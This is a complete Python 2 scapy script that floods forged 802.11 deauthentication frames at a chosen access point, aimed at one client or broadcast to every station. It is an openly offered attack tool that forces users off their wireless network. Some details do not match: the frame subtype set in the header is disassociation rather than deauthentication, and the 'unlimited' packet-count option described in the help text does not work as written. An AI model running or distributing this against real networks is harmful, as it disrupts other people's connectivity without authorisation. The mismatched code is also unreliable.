#!/usr/bin/env python
# Change the client to FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point

import argparse
import sys

from scapy.all import *

parser = argparse.ArgumentParser(description="Wifi AP deauth.")
parser.add_argument("-i", "--interface", type=str, required=True, help="interface")
parser.add_argument("-a", "--access-point", type=str, required=True, help="Target access point")
parser.add_argument("-c", "--client", type=str, required=True, help="To kickout all user enput 'all' on Target client")
parser.add_argument("-n", "--number", type=int, required=False, help="Number of packets (blank or 0 for unlimited)")

args = parser.parse_args() 
conf.iface = args.interface
bssid = args.access_point
client = args.client
count = args.number

if client == 'all':	
	conf.verb = 0
	packet = RadioTap()/Dot11(type=0,subtype=10,addr1='FF:FF:FF:FF:FF:FF',addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	for n in range(int(count)):
		sendp(packet)
		print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for all Client'
else:
	conf.verb = 0
	packet = RadioTap()/Dot11(type=0,subtype=10,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	for n in range(int(count)):
		sendp(packet)
		print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
	
